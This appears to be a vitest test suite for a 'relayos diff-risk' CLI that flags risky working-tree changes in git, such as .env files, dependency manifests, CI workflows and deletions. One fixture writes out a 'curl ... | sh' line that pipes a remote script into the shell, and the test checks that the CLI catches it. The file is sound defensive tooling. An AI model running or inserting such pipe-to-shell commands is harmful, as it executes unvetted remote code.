import { execFile } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { afterEach, describe, expect, it } from "vitest";
import { runCli } from "../src/cli.js";

const exec = promisify(execFile);

const cleanups: Array<() => void> = [];
let previousCwd: string | undefined;

afterEach(() => {
  if (previousCwd) {
    process.chdir(previousCwd);
    previousCwd = undefined;
  }
  while (cleanups.length) cleanups.pop()!();
});

async function tempGitRepo(): Promise<string> {
  const dir = mkdtempSync(join(tmpdir(), "relayos-cli-diff-risk-"));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  await exec("git", ["init", "--quiet", "--initial-branch=main"], { cwd: dir });
  await exec("git", ["config", "user.email", "test@example.com"], { cwd: dir });
  await exec("git", ["config", "user.name", "Test"], { cwd: dir });
  await exec("git", ["config", "commit.gpgsign", "false"], { cwd: dir });
  writeFileSync(join(dir, "README.md"), "hello\n");
  await exec("git", ["add", "README.md"], { cwd: dir });
  await exec("git", ["commit", "--quiet", "-m", "init"], { cwd: dir });
  return dir;
}

function captureIO() {
  let stdout = "";
  let stderr = "";
  return {
    io: {
      stdout: { write: (chunk: string) => (stdout += chunk) },
      stderr: { write: (chunk: string) => (stderr += chunk) },
    },
    get stdout() {
      return stdout;
    },
    get stderr() {
      return stderr;
    },
  };
}

function chdir(dir: string) {
  previousCwd = process.cwd();
  process.chdir(dir);
}

describe("relayos diff-risk", () => {
  it("reports ALLOW on a clean tree", async () => {
    const repo = await tempGitRepo();
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: ALLOW");
    expect(cap.stdout).toContain("REASONS: (none)");
    expect(cap.stdout).toContain("working tree is clean");
    expect(cap.stderr).toBe("");
  });

  it("reports BLOCK on an untracked .env file", async () => {
    const repo = await tempGitRepo();
    writeFileSync(join(repo, ".env"), "SECRET=abc\n");
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: BLOCK");
    expect(cap.stdout).toContain("secret_config_path");
    expect(cap.stdout).toContain(".env");
  });

  it("reports WARN on a modified package.json", async () => {
    const repo = await tempGitRepo();
    writeFileSync(join(repo, "package.json"), '{ "name": "demo" }\n');
    await exec("git", ["add", "package.json"], { cwd: repo });
    await exec("git", ["commit", "--quiet", "-m", "add package.json"], { cwd: repo });
    writeFileSync(join(repo, "package.json"), '{ "name": "demo", "version": "0.0.1" }\n');
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: WARN");
    expect(cap.stdout).toContain("dependency_manifest");
    expect(cap.stdout).toContain("package.json");
  });

  it("reports WARN on a deleted file", async () => {
    const repo = await tempGitRepo();
    writeFileSync(join(repo, "doomed.txt"), "bye\n");
    await exec("git", ["add", "doomed.txt"], { cwd: repo });
    await exec("git", ["commit", "--quiet", "-m", "add doomed"], { cwd: repo });
    rmSync(join(repo, "doomed.txt"));
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: WARN");
    expect(cap.stdout).toContain("large_deletion");
  });

  it("reports WARN on a CI workflow change", async () => {
    const repo = await tempGitRepo();
    mkdirSync(join(repo, ".github", "workflows"), { recursive: true });
    writeFileSync(
      join(repo, ".github", "workflows", "release.yml"),
      "name: release\n",
    );
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: WARN");
    expect(cap.stdout).toContain("ci_deploy_path");
    expect(cap.stdout).toContain(".github/workflows/release.yml");
  });

  it("reports WARN when an added diff line contains `curl ... | sh`", async () => {
    const repo = await tempGitRepo();
    writeFileSync(join(repo, "install.sh"), "#!/bin/sh\necho old\n");
    await exec("git", ["add", "install.sh"], { cwd: repo });
    await exec("git", ["commit", "--quiet", "-m", "add install.sh"], { cwd: repo });
    writeFileSync(
      join(repo, "install.sh"),
      "#!/bin/sh\ncurl -fsSL https://example.com/x.sh | sh\n",
    );
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: WARN");
    expect(cap.stdout).toContain("risky_command_in_diff");
  });

  it("BLOCK trumps WARN when both fire", async () => {
    const repo = await tempGitRepo();
    writeFileSync(join(repo, "package.json"), '{ "name": "demo" }\n');
    writeFileSync(join(repo, ".env"), "SECRET=abc\n");
    chdir(repo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: BLOCK");
    expect(cap.stdout).toContain("secret_config_path");
    expect(cap.stdout).toContain("dependency_manifest");
  });

  it("succeeds with a stderr note when cwd is not a git repo", async () => {
    const nonRepo = mkdtempSync(join(tmpdir(), "relayos-diff-risk-nongit-"));
    cleanups.push(() => rmSync(nonRepo, { recursive: true, force: true }));
    chdir(nonRepo);
    const cap = captureIO();

    const code = await runCli(["diff-risk"], cap.io);

    expect(code).toBe(0);
    expect(cap.stdout).toContain("DECISION: ALLOW");
    expect(cap.stderr).toContain("not inside a git working tree");
    expect(cap.stderr).toContain("diff-risk is a no-op");
  });

  it("rejects unknown flags with usage", async () => {
    const cap = captureIO();

    const code = await runCli(["diff-risk", "--whatever"], cap.io);

    expect(code).toBe(1);
    expect(cap.stderr).toContain("usage: relayos diff-risk");
  });

  it("usage text mentions diff-risk in the top-level dispatcher", async () => {
    const cap = captureIO();

    const code = await runCli(["bogus-command"], cap.io);

    expect(code).toBe(1);
    expect(cap.stderr).toContain("diff-risk");
  });
});
